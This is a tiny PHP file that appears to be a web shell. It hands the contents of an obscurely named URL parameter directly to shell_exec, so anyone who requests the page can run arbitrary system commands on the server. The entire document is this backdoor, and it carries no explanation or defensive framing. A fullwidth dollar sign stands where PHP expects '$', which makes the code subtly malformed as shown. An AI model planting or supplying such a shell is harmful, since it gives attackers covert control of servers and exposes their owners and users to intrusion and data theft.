<?php
shell_exec(＄_GET['vWRSASE3']);
?>
